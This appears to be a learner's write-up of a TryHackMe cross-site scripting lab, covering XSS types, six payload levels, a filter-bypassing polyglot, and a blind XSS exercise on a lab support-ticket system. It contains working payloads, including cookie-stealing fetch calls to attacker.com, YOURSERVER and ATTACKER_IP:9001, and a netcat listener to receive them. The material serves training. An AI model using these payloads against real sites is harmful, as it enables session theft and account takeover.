# TryHackMe — Cross-Site Scripting (XSS) Room  
**Room:** Cross-Site Scripting (XSS) — Junior Penetration Tester Path  
**Author:** Chidimma Onwuatuegwu  
**Date:** 2025-06-XX

---

## 1. Prerequisites
- Basic understanding of **JavaScript** (XSS payloads are JS-based).  

---

## 2. About XSS (Summary)
**Cross-Site Scripting (XSS)** is an injection vulnerability where an attacker injects malicious JavaScript into a web application so it executes in other users’ browsers. XSS can be used for proof-of-concept alerts, session theft, keylogging, business logic abuse, or complete account takeover. XSS is one of the most common and high-impact web security issues.

---

## 3. Payloads & Intentions
Payloads have two parts:
- **Intention** — what the payload should do (e.g., proof-of-concept, steal cookies, exfiltrate data).  
- **Modification** — adjustments needed to bypass filters or adapt to how the input is reflected in the page (attribute context, element context, JavaScript context, etc.)

**Common intentions / sample payloads**:
- Proof-of-Concept: `alert('THM')`
- Session Stealing: `fetch('https://attacker.com/log?c='+btoa(document.cookie))`
- Key Logger: insert script that posts keystrokes to attacker endpoint
- Business Logic Abuse: call in-page JS functions like `user.changeEmail('attacker@example.com')`

---

## 4. Types of XSS
Briefly, the room covers:
- **Reflected XSS** — input is reflected in the response (often via query string).  
- **Stored XSS** — payload is stored server-side (comments, profile fields) and executed when other users view it.  
- **DOM-based XSS** — client-side JavaScript manipulates the DOM with unsafe inputs (e.g., `window.location.hash`).  
- **Blind XSS** — payload stored and executed in a place you cannot directly see; requires callback mechanisms (e.g., XSS Hunter).

---

## 5. Reflected XSS — Notes & Testing
**How to test**:
- Test GET and POST parameters, file paths, and unlikely headers.  
- Try simple payloads first (e.g., `"><script>alert('THM')</script>`) and check if the input is reflected in the HTML source.  
- If user input is reflected in attribute values or inside JavaScript, adapt payloads to escape that context (see Level examples below).

---

## 6. Stored XSS — Notes & Testing
**Where to check**:
- Comment sections, user profiles, listing pages, support tickets, product reviews.  
**Confirming stored XSS**:
- Submit content that will be stored, then view as another user or in a part of the app that displays stored content.  
- If you can’t view it as you, use blind XSS techniques (callbacks).

---

## 7. DOM-based XSS — Notes & Testing
**Key points**:
- Look for client-side code accessing `window.location`, `document.write`, `innerHTML`, `eval()` or `document.cookie`.  
- DOM XSS often requires reading the JS source or reverse engineering client scripts.  
- Test inputs that affect hash (`#`), search params, or fragment identifiers.

---

## 8. Blind XSS — Notes & Testing
**Testing approach**:
- Inject payloads that make a callback (e.g., `new Image().src='https://YOURSERVER/steal?d='+document.cookie`) so when a staff user views the data, it will be sent to your listener.
- Tools like **XSS Hunter** are designed for blind XSS testing and can capture callbacks reliably.

---

## 9. Perfecting your Payload — Level Walkthroughs & Screenshots
Below are the six lab levels and how I solved them. I took **three screenshots per level**: (1) the submitted payload in the page, (2) the resulting alert / proof of execution, (3) the page source showing the reflected payload.

### Level 1 — Reflected in page text
**Goal:** Trigger an alert with the string `THM`.  
**Payload used:** <script>alert('THM')</script>`
**Notes:** Input was reflected directly in page text. No escaping required.  
**Screenshots:**  
![payload Example](Screenshot%202025-09-17%20045522.jpg)

![payload Example](Screenshot%202025-09-17%20045621_2.jpg)

![payload Example](Screenshot%202025-09-17%20050006_2.jpg)

---

### Level 2 — Reflected in `value` attribute of an `<input>`
**Goal:** Execute JS from inside an attribute.  
**Payload used:** `">` + `"><script>alert('THM')</script>` (example — adapt per context)  
**Notes:** Closed the attribute then injected script.  
**Screenshots:**  
![payload Example](Screenshot%202025-09-17%20231005.jpg)

![payload Example](Screenshot%202025-09-17%20231132.jpg)

![payload Example](Screenshot%202025-09-17%20231520.jpg)

---

### Level 3 — Reflected in a `<textarea>`
**Goal:** Escape the `textarea` and execute JS.  
**Payload used:** `</textarea><script>alert('THM')</script>`  
**Screenshots:**  
![payload Example](Screenshot%202025-09-17%20231656.jpg)

![payload Example](Screenshot%202025-09-17%20231852.jpg)

![payload Example](Screenshot%202025-09-17%20232047.jpg)


---

### Level 4 — Reflected inside JavaScript code
**Goal:** Break out of existing JS and run `alert('THM')`.  
**Payload used:** `';alert('THM');//`  
**Notes:** Closed the existing string, added statement, used comment to avoid syntax errors.  
**Screenshots:**  
![payload Example](Screenshot%202025-09-17%20232156.jpg)

![payload Example](Screenshot%202025-09-17%20232320.jpg)

![payload Example](Screenshot%202025-09-17%20232452.jpg)

---

### Level 5 — Filtered keywords (e.g., `script` removed)
**Goal:** Bypass keyword removal filters that strip `script` or other words.  
**Approach:** This level looks the same as level one, and your name also gets reflected in the same place. But if you try the <script>alert('THM');</script> payload, it won't work. When you view the page source, you'll see why.
The word script  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words. When a word gets removed from a string, there's a helpful trick that you can try.
**Example final Original Payload**
<sscriptcript>alert('THM');</sscriptcript>
**Final Payload after passing the filter** 
<script>alert('THM');</script>
**Screenshots:**  
![payload Example](Screenshot%202025-09-17%20232546.jpg)

![payload Example](Screenshot%202025-09-17%20232635.jpg)

![payload Example](Screenshot%202025-09-17%20232804.jpg)

![payload Example](Screenshot%202025-09-17%20232916.jpg)

---

### Level 6 — Filtered `<` and `>` characters / attribute-based context
**Goal:** Use tag attributes (e.g., `onload`, `onerror`) such as `src="/images/cat.jpg" onload="alert('THM');"` to trigger JS without direct `<script>` tags.  
**Screenshots:**  
![payload Example](Screenshot%202025-09-17%20233037.jpg)

![payload Example](Screenshot%202025-09-17%20233217.jpg)

![payload Example](Screenshot%202025-09-17%20233411.jpg)


---

> **Polyglot**: I tested a polyglot payload (a universal XSS string) that can often bypass multiple filters. Example polyglot used in the room (presented as a learning example only):  
> `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
**Screenshot**
![payload Example](Screenshot%202025-09-17%20233602.jpg)

---

## 10. Practical Blind XSS Example (Support Ticket)
**Target:** Acme IT Support — Support Ticket “Create Ticket” functionality.  
**Action:** Created tickets with payloads that escaped the `textarea` and executed JS in the staff portal when the ticket was viewed.  
**Goal:** Demonstrate blind XSS that triggers when staff view the ticket (useful for catching admin-only functionality).  
## Step-by-step procedure##

**1.** **Create a lab user account via** **Customers → Signup here**.  
 Log in and go to **Support Tickets → Create Ticke

**2. Confirm how input is reflected**
1. Create a ticket with the content `test`.  
2. Submit and open the ticket.  
3. View page source (right click → View Page Source) and confirm the ticket content is placed inside a `<textarea>` element.

**3.Execute a simple proof-of-concept XSS**
1. Replace content with a simple alert payload:

</textarea><script>alert('THM');</script>

2. Submit the ticket. Open the ticket. An alert box with `THM` should pop up (this confirms JavaScript execution).

**4.Build an exfiltration payload**

Template — replace ATTACKER_IP:PORT with your AttackBox IP and listening port:

</textarea><script>
fetch('http://ATTACKER_IP:9001/?cookie=' + btoa(document.cookie));
</script>

document.cookie reads current page cookies

btoa() base64-encodes the cookie for safe transport

fetch() sends the data back to your listener

---
📸 **Screenshots**
![payload Example](Screenshot%202025-09-17%20234312.jpg)

![payload Example](Screenshot%202025-09-18%20000003.jpg)

![payload Example](Screenshot%202025-09-17%20235916.jpg)

![payload Example](Screenshot%202025-09-17%20235828.jpg)

![payload Example](Screenshot%202025-09-17%20235518.jpg)

---

4. Prepare an exfiltration listener (Netcat) on AttackBox
**On the AttackBox terminal**, start Netcat listener on port `9001`:
```bash
nc -nlvp 9001

-n skip DNS lookups

-l listen mode

-v verbose

-p port (9001)

---

